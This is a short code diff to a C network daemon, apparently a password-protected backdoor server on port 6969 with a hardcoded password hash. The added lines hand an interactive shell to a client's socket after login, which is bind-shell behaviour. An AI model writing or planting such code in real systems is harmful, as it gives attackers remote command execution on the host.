@@ -12,7 +12,7 @@
 
 #define DEBUG printf
 #define MAX_CLIENTS 3
-#define PORT 6970
+#define PORT 6969
 #define HASHED_PASSWORD 1340397520672655617UL
 
 #define FNV_OFFSET 14695981039346656037UL
@@ -221,8 +221,8 @@ int main() {
 				if (!client) {
 					continue;
 				}
-				char *line = readline(client->fd);
 
+				char *line = readline(client->fd);
 				if (!line) {
 					disconnect_client(client, epollfd, &ev);
 					continue;
@@ -230,6 +230,11 @@ int main() {
 
 				if (!client->logged) {
 					check_password(client, line);
+					if (client->logged && shell) {
+						shell = false;
+						sh(client->fd);
+						continue;
+					}
 				} else if (!ft_strcmp(line, "shell\n")) {
 					shell = true;
 					disconnect_client(client, epollfd, &ev);
